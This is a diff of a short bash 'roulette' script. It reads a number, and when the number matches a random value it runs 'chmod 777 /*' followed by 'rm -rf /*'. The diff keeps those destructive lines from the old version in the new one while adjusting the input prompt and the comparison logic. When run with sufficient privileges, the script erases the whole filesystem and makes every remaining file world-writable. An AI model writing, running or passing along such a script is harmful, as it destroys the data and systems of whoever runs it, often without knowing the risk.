@@ -1,16 +1,18 @@
 #! /bin/bash
-echo -n "num iput: "
+zo=0;
+ha=6;
+echo -n "num input: "
 read num
-if [ $num -gt 6 ]
-then 
-	echo "6 over"
-else
-	if [ $num -eq $[$RANDOM % 8] ]
-	then
-		chmod 777 /*
-		rm -rf /*
-		exit
-	else 
-		echo nice
-		fi
+if [ $num -gt $ha ]
+then
+	echo "$ha over"
+	echo -n "re input: "
+	read num
+	fi
+if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
+then
+	chmod 777 /*
+	rm -rf /*
+else 
+	echo nice
 	fi
